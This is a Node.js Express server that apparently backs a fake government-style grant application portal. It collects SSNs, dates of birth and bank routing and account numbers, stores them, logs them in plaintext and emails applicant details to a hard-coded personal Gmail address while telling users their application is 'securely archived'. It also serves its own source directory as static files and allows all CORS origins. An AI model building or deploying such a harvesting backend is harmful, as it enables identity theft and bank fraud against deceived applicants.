import express from "express";
import mongoose from "mongoose";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;

// Allow requests from your frontend
app.use(
  cors({
    origin: "*", // In production, replace with your domain
    methods: ["POST", "GET"],
  })
);

app.use(bodyParser.json());

// --- SERVE STATIC FILES (for frontend build) ---
app.use(express.static(path.join(__dirname, "dist")));
app.use(express.static(__dirname));

// --- DATABASE CONNECTION ---
const MONGO_URI =
  process.env.MONGO_URI || "mongodb://localhost:27017/grant_portal";

mongoose
  .connect(MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// --- SCHEMA ---
const ApplicationSchema = new mongoose.Schema({
  grantId: { type: String, required: true },
  fullName: { type: String, required: true },
  dob: String,
  phone: String,
  email: { type: String, required: true },
  address: String,

  ssn: String,

  bankName: String,
  routingNumber: String,
  accountName: String,
  accountNumber: String,

  certification: Boolean,

  status: { type: String, default: "Pending Review" },
  submittedAt: { type: Date, default: Date.now },
});

const Application = mongoose.model("Application", ApplicationSchema);

// --- EMAIL TRANSPORT ---
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER || "admin@example.com",
    pass: process.env.EMAIL_PASS || "password",
  },
});

// --- ROUTE TO HANDLE FORM SUBMISSION ---
app.post("/submit", async (req, res) => {
  try {
    console.log("Received submission:", req.body);

    const applicationData = {
      ...req.body,
      routingNumber: req.body.branch,
    };

    // 1. Save to Database
    const application = new Application(applicationData);
    await application.save();

    // 2. Send Admin Notification Email
    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER || "admin@example.com",
        to: "anne67j@gmail.com",
        subject: `New Grant Application: ${req.body.fullName}`,
        text: `
New Application Received from Official Portal.

--- APPLICANT DETAILS ---
Name: ${req.body.fullName}
DOB: ${req.body.dob}
Email: ${req.body.email}
Phone: ${req.body.phone}
Address: ${req.body.address}

--- GRANT DETAILS ---
Program ID: ${req.body.grantId}

--- BANKING & SECURITY ---
Bank Name: ${req.body.bankName}
Account Holder: ${req.body.accountName}

Status: Pending Review
        `,
      });

      console.log("Notification email sent to anne67j@gmail.com");
    } catch (emailError) {
      console.warn(
        "Email failed to send (check credentials):",
        emailError.message
      );
    }

    // 3. Return Success
    res.status(200).json({
      success: true,
      message: "Application securely archived.",
      referenceId: application._id,
    });
  } catch (error) {
    console.error("Error saving application:", error);
    res
      .status(500)
      .json({ success: false, message: "Internal Server Error" });
  }
});

// --- SPA FALLBACK (React Router support) ---
app.get("/*", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// --- START SERVER ---
app.listen(PORT, () =>
  console.log(`Server running securely on http://localhost:${PORT}`)
);
